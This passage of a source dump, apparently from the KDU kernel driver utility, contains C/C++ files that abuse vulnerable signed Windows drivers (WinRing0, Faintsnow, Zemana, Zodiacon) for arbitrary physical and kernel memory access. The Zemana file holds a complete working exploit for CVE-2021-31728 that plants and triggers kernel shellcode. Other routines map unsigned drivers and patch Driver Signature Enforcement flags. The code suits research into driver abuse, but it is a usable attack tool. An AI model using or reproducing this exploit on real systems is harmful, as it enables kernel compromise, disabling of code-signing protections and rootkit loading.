* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI WRZeroVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        WRZeroQueryPML4Value,
        WRZeroReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* WRZeroReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI WRZeroReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroReadPhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

/*
* WRZeroWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI WRZeroWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = WRZeroVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = WRZeroWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/winring0.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       WINRING0.H
*
*  VERSION:     1.43
*
*  DATE:        10 Nov 2024
*
*  WinRing0 based drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// WinRing0 driver interface definitions. Recognizable CVE-2017-14311.
//
// Taken from WinRing0 source.
//

#define OLS_TYPE            (DWORD)40000

#define OLS_READ_MEMORY     (DWORD)0x841
#define OLS_WRITE_MEMORY    (DWORD)0x842

#define IOCTL_OLS_READ_MEMORY \
	CTL_CODE(OLS_TYPE, OLS_READ_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_MEMORY \
	CTL_CODE(OLS_TYPE, OLS_WRITE_MEMORY, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#pragma pack(push,4)

typedef struct _OLS_READ_MEMORY_INPUT {
    PHYSICAL_ADDRESS Address;
    ULONG UnitSize;
    ULONG Count;
} OLS_READ_MEMORY_INPUT;

typedef struct _OLS_WRITE_MEMORY_INPUT {
    PHYSICAL_ADDRESS Address;
    ULONG UnitSize;
    ULONG Count;
    UCHAR Data[1];
} OLS_WRITE_MEMORY_INPUT;

#pragma pack(pop)

//
// Faintsnow Hardware read & write driver interface.
// Essentially it's a slightly tweaked WinRing0 copy-paste.
//
// Related CVE's: 
//    CVE-2021-29337, CVE-2023-1679, CVE-2021-29337, CVE-2020-13517 etc, all the same and all makes zero sense.
//

#define HWRWDRV_TYPE        (DWORD)0x9C40

#define HWRW_READ_MEMORY     (DWORD)0x841
#define HWRW_WRITE_MEMORY    (DWORD)0x842

#define IOCTL_HWRW_READ_MEMORY        \
    CTL_CODE(HWRWDRV_TYPE, HWRW_READ_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS) //0x9C406104

#define IOCTL_HWRW_WRITE_MEMORY       \
    CTL_CODE(HWRWDRV_TYPE, HWRW_WRITE_MEMORY, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x9C40A108

BOOL WINAPI WRZeroReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WRZeroWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WRZeroQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI WRZeroVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI WRZeroReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI WRZeroWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/zemana.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2026
*
*  TITLE:       ZEMANA.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Zemana driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/zemana.h"

#define ZEMANA_POOL_TAG 'ANMZ'

BYTE g_DebugBuffer[2048];

#ifdef __cplusplus
extern "C" {
    void ZmShellStager();
    void ZmShellStagerEnd();
    void ZmShellDSEFix();
    void ZmShellDSEFixEnd();
}
#endif

#pragma pack( push, 1 )
typedef struct _ZM_SCSI_ACCESS {
    ULONG32 DiskNumber;
    UCHAR   Pad0;

    UCHAR   PathId;
    UCHAR   TargetId;
    UCHAR   Lun;

    ULONG32 OffsetHigh;
    ULONG32 OffsetLow;

    ULONG32 Length;

    ULONG32 Count;
    //irrelevant
} ZM_SCSI_ACCESS, * PZM_SCSI_ACCESS;

typedef struct _ZM_SCSI_MINIPORT_FIX {
    CHAR    DriverName[MAX_PATH];
    ULONG32 Offset_Func1;
    UCHAR    FixCode_Func1[128];
    ULONG32 Offset_Func2;
    UCHAR    FixCode_Func2[128];
} ZM_SCSI_MINIPORT_FIX, * PZM_SCSI_MINIPORT_FIX;
#pragma pack( pop )

typedef struct _UNZERO_PTR {
    ULONG_PTR   addr;
    ULONG_PTR   mask;
} UNZERO_PTR, * PUNZERO_PTR;

/*
* UnzeroXorMask
*
* Purpose:
*
* Shellcode can't contain 2 consecutive zeroes because Zemana expects it to be a string.
* Make supplied address string buffer compatible.
*
*/
UNZERO_PTR UnzeroXorMask(ULONG_PTR x)
{
    int             c;
    unsigned char   e;
    ULONG_PTR       u, w;
    UNZERO_PTR      r = { 0, 0 };

    for (c = 0; c < sizeof(r.addr); ++c)
    {
        e = x & 0xff;

        if (e == 0x69)
        {
            w = (e ^ 0xaa);
            u = (0xaa);
        }
        else
        {
            w = (e ^ 0x69);
            u = (0x69);
        }

        r.addr += w << (8 * c);
        r.mask += u << (8 * c);
        x >>= 8;
    }

    return r;
}

/*
* ZmExploit_CVE2021_31728
*
* Purpose:
*
* Exploit Zemana crapware features using CVE2021-31728.
* Note several earlier exploits for wide variety of this fake AV factory "SDK" used as well.
*
*/
BOOL ZmExploit_CVE2021_31728(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID StagerShellCode,
    _In_ SIZE_T StagerShellSize
)
{
    BOOL bResult = FALSE;
    PSYSTEM_BIGPOOL_INFORMATION pi = NULL;
    ULONG_PTR* poolList = NULL;
    ULONG i, poolCount = 0, currentPool = 0;

    ZM_SCSI_ACCESS scsiRequest;
    CHAR sectorBuffer[512];
    CHAR buffer[4096 - 16 + 4];

    do {

        if (StagerShellSize > 2048) {
            supPrintfEvent(kduEventError,
                "[!] Stager size exceeds limit, abort\r\n");
            break;
        }

        //
        // At first we locate initial Zemana pools and remember them.
        //
        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
        if (pi == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Failed to query pool information, abort\r\n");
            break;
        }

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG)
                poolCount++;
        }

        if (poolCount == 0) {
            supPrintfEvent(kduEventError,
                "[!] Abort: No Zemana pools found\r\n");
            break;
        }

        printf_s("[+] Number of Zemana pools found: %lu\r\n", poolCount);

        poolList = (ULONG_PTR*)supHeapAlloc(poolCount * sizeof(ULONG_PTR));
        if (poolList == NULL)
            break;

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG)
                poolList[currentPool++] = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress;
        }

        supHeapFree(pi);
        pi = NULL;

        //
        // Second, insert FsRtlIsNameInExpression bypass entry.
        //
        WCHAR FsRtlIsNameInExpressionEntry[6];

        FsRtlIsNameInExpressionEntry[2] = '*';
        FsRtlIsNameInExpressionEntry[3] = '.';
        FsRtlIsNameInExpressionEntry[4] = 'A';
        FsRtlIsNameInExpressionEntry[5] = 0;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_PROTECT_REGISTRY,
            &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry),
            &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry));

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Failed to insert FsRtlIsNameInExpression bypass entry, abort\r\n");
            break;
        }

        //
        // Next, move shellcode into string buffer.
        //
        RtlFillMemory(buffer, 4096 - 16 + 4, 0xCC);
        RtlCopyMemory(&buffer[4], StagerShellCode, StagerShellSize);

        //
        // Fill string buffer tail.
        //
        buffer[4096 - 16 + 4 - 6] = '.';
        buffer[4096 - 16 + 4 - 5] = 0;
        buffer[4096 - 16 + 4 - 4] = 'A';
        buffer[4096 - 16 + 4 - 3] = 0;

        buffer[4096 - 16 + 4 - 2] = 0;
        buffer[4096 - 16 + 4 - 1] = 0;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_PROTECT_REGISTRY,
            buffer, 4096 - 16 + 4,
            buffer, 4096 - 16 + 4);

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Failed to insert shellcode into string buffer, abort\r\n");
            break;
        }

        //
        // Find new Zemana driver pool, if there is anything new - we failed.
        //
        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
        if (pi == NULL) {
            supPrintfEvent(kduEventError,
                "[!] Failed to query pool information, abort\r\n");
            break;
        }

        BOOL bFound = TRUE;
        ULONG_PTR kernelShellCode = 0;

        for (i = 0; i < pi->Count; i++) {
            if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG) {

                bFound = TRUE;

                for (currentPool = 0; currentPool < poolCount; currentPool++) {

                    bFound = (poolList[currentPool] == (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress);
                    if (bFound)
                        break;

                }

                if (!bFound) {
                    kernelShellCode = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress & ~1;
                    kernelShellCode += 0x10;
                    break;
                }
            }
        }

        supHeapFree(pi);
        pi = NULL;

        supHeapFree(poolList);
        poolList = NULL;

        if (bFound) {
            supPrintfEvent(kduEventError,
                "[!] Could not find allocated stager shellcode, abort\r\n");
            break;
        }

        printf_s("[+] Stager shellCode allocated at 0x%llX\r\n", kernelShellCode);

        CHAR szDriverName[MAX_PATH];

        RtlSecureZeroMemory(&szDriverName, sizeof(szDriverName));
        

        //
        // Trigger shellcode.
        //
        ZM_SCSI_MINIPORT_FIX MiniportFix;
        ANSI_STRING drvFileName;

        RtlSecureZeroMemory(&MiniportFix, sizeof(MiniportFix));

        drvFileName.Buffer = NULL;
        drvFileName.Length = drvFileName.MaximumLength = 0;

        if (!NT_SUCCESS(supConvertToAnsi(Context->Provider->LoadData->DriverName, &drvFileName)))
            break;

        StringCchPrintfA(MiniportFix.DriverName, MAX_PATH, "%s.sys", drvFileName.Buffer);

        RtlFreeAnsiString(&drvFileName);

        MiniportFix.Offset_Func1 = 0xD553; //driver specific offset, correct it for another sample

        BYTE patchCode[] =
        {   0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
            0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
            0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
            0xEB, 0x00                                                  // jmp rel8 
        };

        RtlCopyMemory(MiniportFix.FixCode_Func1, patchCode, sizeof(patchCode));

        //
        // Point the call to it.
        //
        *(ULONG64*)(MiniportFix.FixCode_Func1 + 2) = kernelShellCode;

        bResult = supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_SAVE_MINIPORT_FIX,
            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX),
            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX));

        if (!bResult) {
            supPrintfEvent(kduEventError,
                "[!] Could not install miniport hook, abort\r\n");
            break;
        }

        printf_s("[+] Zemana miniport hook installed, performing stager shellcode execution\r\n");

        RtlSecureZeroMemory(&scsiRequest, sizeof(scsiRequest));

        scsiRequest.Count = 512;
        scsiRequest.Length = 1;
        RtlFillMemory(sectorBuffer, sizeof(sectorBuffer), 0xff);

        supCallDriver(Context->DeviceHandle,
            IOCTL_ZEMANA_SCSI_WRITE,
            &scsiRequest, sizeof(ZM_SCSI_ACCESS),
            &sectorBuffer, sizeof(sectorBuffer));

        printf_s("[+] Stager shellcode executed\r\n");

        bResult = TRUE;

    } while (FALSE);

    if (pi) supHeapFree(pi);
    if (poolList) supHeapFree(poolList);

    return bResult;
}

/*
* ZmMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL ZmMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bResult = FALSE, bLocked = FALSE;

    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;

    ULONG cbPayload = 0;
    PVOID pvPayload = NULL;

    HANDLE sectionHandle = NULL;
    HANDLE victimDeviceHandle = NULL;
    ULONG_PTR dispatchAddress = 0;

    unsigned char shellBuffer[1000];
    SIZE_T shellSize = (ULONG_PTR)ZmShellStagerEnd - (ULONG_PTR)ZmShellStager;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    do {
        if (VpCreate(victimProv,
            Context->ModuleBase,
            &victimDeviceHandle,
            NULL,
            NULL))
        {
            printf_s("[+] Victim is loaded, handle 0x%p\r\n", victimDeviceHandle);
        }
        else {
            supShowWin32Error("[!] Cannot load victim target", GetLastError());
        }

        VICTIM_DRIVER_INFORMATION vdi;

        RtlSecureZeroMemory(&vdi, sizeof(vdi));

        if (!VpQueryInformation(Context->Victim, VictimDriverInformation, &vdi, sizeof(vdi))) {
            supShowWin32Error("[!] Cannot query victim driver information", GetLastError());
            break;
        }

        dispatchAddress = vdi.LoadedImageBase;

        if (dispatchAddress == 0) {
            supPrintfEvent(kduEventError,
                "[!] Could not query victim target\r\n");
            break;
        }
        
        VICTIM_IMAGE_INFORMATION vi;

        RtlSecureZeroMemory(&vi, sizeof(vi));

        if (!VpQueryInformation(
            Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
        {
            supShowWin32Error("[!] Cannot query victim image information", GetLastError());
            break;
        }

        dispatchAddress += vi.DispatchOffset;

        printf_s("[+] Victim target 0x%llX\r\n", dispatchAddress);

        pvPayload = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
#ifdef _DEBUG
        RtlFillMemory(g_DebugBuffer, sizeof(g_DebugBuffer), 0xCC);
        pvPayload = &g_DebugBuffer;
#else
        if (pvPayload == NULL)
            break;
#endif
        cbPayload = ScSizeOf(KDU_SHELLCODE_V4, NULL);
        bLocked = VirtualLock(pvPayload, cbPayload);
        if (!bLocked)
            break;

        RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
        RtlCopyMemory(shellBuffer, ZmShellStager, shellSize);

        UNZERO_PTR uptr;

        //
        // Target dispatch address.
        //
        uptr = UnzeroXorMask((ULONG_PTR)dispatchAddress);
        *(PULONG_PTR)&shellBuffer[0x5] = uptr.addr;
        *(PULONG_PTR)&shellBuffer[0xf] = uptr.mask;

        //
        // Payload address.
        //
        uptr = UnzeroXorMask((ULONG_PTR)pvPayload);
        *(PULONG_PTR)&shellBuffer[0x1f] = uptr.addr;
        *(PULONG_PTR)&shellBuffer[0x29] = uptr.mask;

        bResult = ZmExploit_CVE2021_31728(Context, &shellBuffer, shellSize);

        if (!bResult) {
            supPrintfEvent(kduEventError, "[!] Could not trigger exploit\r\n");
            break;
        }

        printf_s("[+] Forcing provider unload, please wait\r\n");

        //
        // Force unload provider driver.
        //
        NtClose(Context->DeviceHandle);
        Context->DeviceHandle = NULL;

        Context->Provider->Callbacks.StopVulnerableDriver(Context);

    } while (FALSE);

    if (bLocked) VirtualUnlock(pvPayload, cbPayload);
    if (pvPayload) ntsupVirtualFree(pvPayload);
    if (sectionHandle) {
        NtClose(sectionHandle);
    }
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);
    return bResult;
}

/*
* ZmControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state via Zemana driver.
*
*/
BOOL ZmControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    UNZERO_PTR uptr;
    unsigned char shellBuffer[1000];
    SIZE_T shellSize = (ULONG_PTR)ZmShellDSEFixEnd - (ULONG_PTR)ZmShellDSEFix;

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, ZmShellDSEFix, shellSize);

    //
    // Kernel DSE flags address
    //
    uptr = UnzeroXorMask(Address);
    *(PULONG_PTR)&shellBuffer[0x3] = uptr.addr;
    *(PULONG_PTR)&shellBuffer[0xd] = uptr.mask;

    //
    // New value to be written
    //
    uptr = UnzeroXorMask(DSEValue);
    *(PULONG_PTR)&shellBuffer[0x1a] = uptr.addr;
    *(PULONG_PTR)&shellBuffer[0x24] = uptr.mask;

    bResult = ZmExploit_CVE2021_31728(Context, &shellBuffer, shellSize);

    if (bResult)
        supPrintfEvent(kduEventInformation, "[+] DSE patch executed successfully\r\n");

    return bResult;
}

/*
* ZmOpenProcess
*
* Purpose:
*
* Open process via Zemana driver.
*
*/
BOOL WINAPI ZmOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    *ProcessHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_ZEMANA_OPEN_PROCESS,
        &ProcessId,
        sizeof(ProcessId),
        ProcessHandle,
        (ULONG)sizeof(ProcessHandle));
}

/*
* ZmRegisterDriver
*
* Purpose:
*
* Register Zemana driver client.
*
*/
BOOL WINAPI ZmRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    DWORD currentProcessId = GetCurrentProcessId(), dummy = 0;

    return supCallDriver(DeviceHandle,
        IOCTL_ZEMANA_REGISTER_PROCESS,
        &currentProcessId,
        sizeof(DWORD),
        &dummy,
        sizeof(DWORD));
}

```

`Source/Hamakaze/idrv/zemana.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ZEMANA.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Zemana driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

//
// Zemana generic driver interface
//
//
// WARNING:
//
// Zemana has many faces since it driver was distributed as part of their "SDK". 
// The derivatives are all the same and exceptionally bugged as well, e.g. MalwareFox, WatchDog Anti-Malware etc.
//
#define FILE_DEVICE_ZEMANA (DWORD)0x8000

#define ZEMANA_REGISTER_PROCESS  (DWORD)0x804
#define ZEMANA_SCSI_READ         (DWORD)0x805
#define ZEMANA_SCSI_WRITE        (DWORD)0x806
#define ZEMANA_PROTECT_REGISTRY  (DWORD)0x810
#define ZEMANA_SAVE_MINIPORT_FIX (DWORD)0x811
#define ZEMANA_OPEN_PROCESS      (DWORD)0x813

#define IOCTL_ZEMANA_REGISTER_PROCESS       \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_REGISTER_PROCESS, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002010

#define IOCTL_ZEMANA_SCSI_READ              \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_SCSI_READ, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002014

#define IOCTL_ZEMANA_SCSI_WRITE     \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_SCSI_WRITE, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002018

#define IOCTL_ZEMANA_SAVE_MINIPORT_FIX      \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_SAVE_MINIPORT_FIX, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002044

#define IOCTL_ZEMANA_PROTECT_REGISTRY      \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_PROTECT_REGISTRY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002040

#define IOCTL_ZEMANA_OPEN_PROCESS      \
    CTL_CODE(FILE_DEVICE_ZEMANA, ZEMANA_OPEN_PROCESS, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x8000204C  

BOOL ZmMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase);

BOOL ZmControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);

BOOL WINAPI ZmOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

BOOL WINAPI ZmRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/zodiacon.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ZODIACON.CPP
*
*  VERSION:     1.32
*
*  DATE:        10 Jun 2022
*
*  Zodiacon driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/zodiacon.h"

HANDLE g_ZdcPhysicalMemorySection = NULL;

/*
* KObExpReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via KObExp driver.
*
*/
BOOL WINAPI KObExpReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_READ_VMEM,
        &VirtualAddress,
        sizeof(VirtualAddress),
        Buffer,
        NumberOfBytes);
}

/*
* KObExpWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via KObExp driver.
*
*/
BOOL WINAPI KObExpWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    return supCallDriver(DeviceHandle, IOCTL_KOBEXP_WRITE_VMEM,
        &VirtualAddress,
        sizeof(VirtualAddress),
        Buffer,
        NumberOfBytes);
}

#define ZdcMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite) \
    supMapPhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, NumberOfBytes, MapForWrite)

#define ZdcUnmapMemory(BaseAddress) supUnmapPhysicalMemory(BaseAddress)

#define ZdcReadWritePhysicalMemory(PhysicalAddress, Buffer, NumberOfBytes, DoWrite) \
    supReadWritePhysicalMemory(g_ZdcPhysicalMemorySection, PhysicalAddress, Buffer, NumberOfBytes, DoWrite)

/*
* ZdcReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI ZdcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return ZdcReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* ZdcWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI ZdcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return ZdcReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* ZdcQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI ZdcQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    ULONG cbRead = 0x100000;

    UNREFERENCED_PARAMETER(DeviceHandle);

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)ZdcMapMemory(0ULL,
        cbRead,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        ZdcUnmapMemory((PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* ZdcVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI ZdcVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        ZdcQueryPML4Value,
        ZdcReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* ZdcReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI ZdcReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = ZdcVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = ZdcReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* ZdcWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI ZdcWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = ZdcVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = ZdcReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* ZdcpOpenDriver
*
* Purpose:
*
* Open Zodiacon drivers with their locking features in mind.
*
*/
BOOL WINAPI ZdcpOpenDriver(
    _In_ PVOID Param
)
{
    BOOL bResult = FALSE;
    PVOID ipcServer = NULL;
    KDU_CONTEXT* Context = (PKDU_CONTEXT)Param;
    DWORD cch;
    ULONG resourceSize = 0;
    WCHAR szTemp[MAX_PATH + 1], szFileName[MAX_PATH * 2];
    LPWSTR lpCommand;
    LPWSTR lpTargetName;

    switch (Context->Provider->LoadData->ResourceId) {

    case IDR_KREGEXP:
        lpTargetName = (LPWSTR)ZODIACON_REGEXP_EXE;
